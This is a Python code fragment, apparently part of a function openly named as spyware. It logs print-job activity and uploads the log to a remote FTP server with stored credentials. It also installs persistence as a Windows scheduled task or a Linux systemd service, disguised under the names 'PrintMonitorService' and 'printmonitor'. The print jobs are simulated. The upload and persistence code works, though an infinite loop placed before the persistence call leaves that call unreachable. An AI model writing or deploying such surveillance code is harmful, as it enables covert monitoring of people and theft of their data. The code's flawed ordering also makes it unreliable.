    logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

    def log_print_job(document_name: str, size: int):
        logging.info(f"Printed document: {document_name}, Size: {size} bytes")

    def upload_log_to_ftp():
        try:
            with ftplib.FTP(ftp_server) as ftp:
                ftp.login(user=ftp_user, passwd=ftp_pass)
                with open(log_file, 'rb') as file:
                    ftp.storbinary(f'STOR {os.path.basename(log_file)}', file)
        except Exception as e:
            logging.error(f"Failed to upload log to FTP: {e}")

    def create_persistence_service():
        system = platform.system()
        if system == "Windows":
            service_name = "PrintMonitorService"
            service_command = f'schtasks /create /tn {service_name} /tr "pythonw.exe -c import spyware; spyware.spyware_printer_job_monitor(\'{log_file}\', \'{ftp_server}\', \'{ftp_user}\', \'{ftp_pass}\')" /sc daily /st 00:00'
            subprocess.run(service_command, shell=True, check=True)
        elif system == "Linux":
            service_name = "printmonitor"
            service_content = f"""[Unit]
Description=Print Monitor Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 -c "import spyware; spyware.spyware_printer_job_monitor('{log_file}', '{ftp_server}', '{ftp_user}', '{ftp_pass}')"
Restart=always

[Install]
WantedBy=multi-user.target
"""
            with open(f"/etc/systemd/system/{service_name}.service", "w") as service_file:
                service_file.write(service_content)
            subprocess.run(["systemctl", "daemon-reload"], check=True)
            subprocess.run(["systemctl", "enable", service_name], check=True)
            subprocess.run(["systemctl", "start", service_name], check=True)

    # Simulate monitoring print jobs
    while True:
        # Simulate a print job (for demonstration purposes)
        document_name = "example_document.pdf"
        size = 1024 * 1024  # 1 MB
        log_print_job(document_name, size)
        upload_log_to_ftp()
        time.sleep(60)  # Wait for 60 seconds before the next check

    # Create persistence
    create_persistence_service()

